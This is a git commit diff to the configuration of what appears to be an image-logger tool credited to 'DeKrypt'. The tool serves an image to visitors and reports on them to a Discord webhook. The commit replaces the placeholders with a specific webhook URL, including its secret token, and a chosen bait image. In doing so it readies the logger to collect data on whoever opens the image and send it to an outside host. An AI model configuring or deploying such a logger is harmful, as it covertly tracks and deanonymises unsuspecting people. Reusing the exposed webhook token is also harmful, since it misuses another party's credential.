d1af41010b86db228cde1b22006e747ffc48dc26
Bruitdev <valentin.jan11997@gmail.com>
2025-01-31 05:50:40 +0100

    bro your not sigma

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334747146402005043/y4xa3AcnkTXWBBrVMmIdqja5EkKJ0FM6fT0gk6PN14MeHuPlyaPXyTA35RJBiro58hS5",
+    "image": "https://stageandcinema.com/wp-content/uploads/2024/09/image2.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
